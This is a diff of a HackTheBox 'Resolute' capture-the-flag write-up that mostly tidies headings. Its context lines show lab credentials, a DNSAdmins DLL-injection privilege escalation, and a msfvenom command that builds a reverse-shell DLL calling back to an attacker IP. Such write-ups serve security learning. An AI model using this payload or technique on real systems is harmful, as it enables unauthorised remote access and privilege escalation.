@@ -4,7 +4,6 @@ tags: [windows,medium,dll_injection,crackmapexec]
 layout: post
 categories : HackTheBox
 ---
----
 
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled.png)
 
@@ -14,7 +13,7 @@ Link: [https://www.hackthebox.eu/home/machines/profile/220](https://www.hacktheb
 
 Let's Begin with our Initial Nmap Scan.
 
-## Nmap Scan Results:
+## Nmap Scan Results
 
 ```bash
 PORT      STATE  SERVICE      VERSION
@@ -84,7 +83,7 @@ Host script results:
 ```
 
 
-## Enum4Linux:
+## Enum4Linux
 
 Since SMB port is open, We can use Enum4Linux to get any useful information.<br/>
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/2.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/2.png)<br/>
@@ -156,7 +155,7 @@ We get `Access is Denied` for use `melanie` so let's try login with that.
 
 
 
-## Getting User Shell:
+## Getting User Shell
 
 We logged in using `melanie : Welcome123!`<br/>
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/Untitled%202.png)<br/>
@@ -173,7 +172,7 @@ Checking the file reveals user `ryan` password which is `Serv3r4Admin4cc123!`<br
 ![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/qq.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-resolute/qq.png)
 
 
-## Getting Shell as Ryan:
+## Getting Shell as Ryan
 
 
 Logged in with `ryan : Serv3r4Admin4cc123!`<br/>
@@ -231,10 +230,10 @@ There is a popular attack called `DLL Injection`
 
 **Reference:** [https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
 
-## Privilege Escalation:
+## Privilege Escalation
 
 
-### Building the Payload:
+### Building the Payload
 
 ```bash
 root@w0lf:~/CTF/HTB/Boxes/Resolute# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=1234 -f dll > root.dll
